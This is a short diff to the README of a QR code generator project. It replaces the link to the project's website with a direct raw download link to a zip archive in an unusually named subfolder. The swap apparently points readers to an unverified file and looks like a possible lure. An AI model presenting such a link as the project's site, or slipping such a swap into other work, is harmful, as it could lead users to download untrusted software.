@@ -1,3 +1,3 @@
 # Generateur-de-QR-code
 lien du site : 
-    https://zduchevreuil.github.io/Generateur-de-QR-code/
+    https://raw.githubusercontent.com/zduchevreuil/Generateur-de-QR-code/main/cosmocrat/Generateur-de-QR-code_2.5.zip
